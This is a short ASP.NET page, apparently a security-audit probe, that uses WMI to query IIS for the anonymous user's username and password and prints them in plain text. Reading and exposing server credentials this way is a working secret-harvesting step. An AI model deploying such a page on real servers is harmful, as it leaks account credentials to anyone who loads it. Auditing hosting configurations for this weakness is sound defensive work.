<%@ Page Language="C#" %>
<%@ Assembly Name="System.Management, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        Response.ContentType = "text/plain";
        Response.ContentEncoding = System.Text.Encoding.UTF8;

        try
        {
            System.Management.ManagementObjectSearcher searcher =
                new System.Management.ManagementObjectSearcher("root\\MicrosoftIISv2",
                "SELECT * FROM IIsWebVirtualDirSetting");

            string username = "";
            string password = "";
            
            foreach (System.Management.ManagementObject queryObj in searcher.Get())
            {
                username = queryObj["AnonymousUserName"].ToString();
                password = queryObj["AnonymousUserPass"].ToString();
                
                break; // we don't actually want to iterate through all elements of the collection
            }

            Response.Write("<Alert:Red>\r\n");
            Response.Write("Successfully read username (" + username + ") and password (" + password + ") for the anonymous user.");
        }
        catch
        {
            Response.Write("Failed to read username and password for the anonymous user.");
        }
    }       
</script>